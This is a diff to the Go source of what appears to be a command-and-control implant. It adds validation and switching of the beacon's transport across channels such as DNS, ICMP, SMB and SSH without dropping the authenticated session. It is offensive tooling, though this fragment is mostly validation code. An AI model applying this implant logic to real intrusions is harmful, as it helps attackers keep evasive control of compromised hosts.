@@ -5,9 +5,13 @@ package main
 
 import (
 	"fmt"
+	"net/url"
+	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
+
+	"github.com/forgec2/forgec2/pkg/protocol"
 )
 
 // ?? Multi-C2 mode dispatch ???????????????????????????????????????????????
@@ -299,6 +303,72 @@ func applyTransport(name string) {
 	if idx, ok := indexOfTransportURL(name); ok {
 		currentC2Idx.Store(int32(idx))
 	}
+}
+
+// validateTransportMigration is the implant's own gate on a server-provided
+// switch. The response is AEAD-authenticated, but a valid frame from a server
+// with a bad config must still not steer the agent to an unsupported scheme or
+// a transport it has no endpoint for.
+func validateTransportMigration(m *protocol.TransportMigration) (protocol.TransportMigration, error) {
+	if m == nil {
+		return protocol.TransportMigration{}, fmt.Errorf("no migration supplied")
+	}
+	transport := strings.ToLower(strings.TrimSpace(m.Transport))
+	if transport == "" || !urlListHasTransport(transport) && !supportedBeaconTransport(transport) {
+		return protocol.TransportMigration{}, fmt.Errorf("unsupported transport %q", m.Transport)
+	}
+	target := strings.TrimSpace(m.C2URL)
+	if target != "" {
+		if !hasValidC2Scheme(target) {
+			return protocol.TransportMigration{}, fmt.Errorf("migration c2_url has an unsupported scheme")
+		}
+		parsed, err := url.Parse(target)
+		if err != nil || parsed.Host == "" {
+			return protocol.TransportMigration{}, fmt.Errorf("migration c2_url is not absolute")
+		}
+		if !schemeMatchesTransport(strings.ToLower(parsed.Scheme), transport) {
+			return protocol.TransportMigration{}, fmt.Errorf("transport %q cannot dial a %s URL", transport, parsed.Scheme)
+		}
+	}
+	return protocol.TransportMigration{Transport: transport, C2URL: target}, nil
+}
+
+// supportedBeaconTransport names the transports an agent can switch to even
+// before a URL of that scheme exists; the caller separately requires an
+// endpoint (configured or supplied by the migration) before applying.
+func supportedBeaconTransport(name string) bool {
+	switch name {
+	case "http", "https", "tcp", "tls", "udp", "quic", "icmp", "ws", "wss",
+		"grpc", "grpcs", "ssh", "mtls", "h2c", "dns", "smb":
+		return true
+	}
+	return false
+}
+
+// applyTransportMigration switches the beacon transport without re-enrolling:
+// ECDH session, frame sequence, registration marker and the pending-result
+// queue are intentionally untouched, so the very next beacon continues the
+// same authenticated session over the new transport.
+func applyTransportMigration(m *protocol.TransportMigration) error {
+	validated, err := validateTransportMigration(m)
+	if err != nil {
+		return err
+	}
+	if validated.C2URL != "" {
+		existing := c2URLsSnapshot()
+		if len(existing) == 0 {
+			existing = splitC2URLList(C2URL)
+		}
+		c2URLsStore(mergeServerC2URL(validated.C2URL, existing), 0)
+	}
+	if _, ok := indexOfTransportURL(validated.Transport); !ok {
+		return fmt.Errorf("no %s endpoint is configured for the migration", validated.Transport)
+	}
+	applyTransport(validated.Transport)
+	if Debug {
+		fmt.Printf("[c2] migration -> %s (session preserved)\n", validated.Transport)
+	}
+	return nil
 }
 
 // maybeRotateTransport is invoked after a failed beacon. Once the consecutive
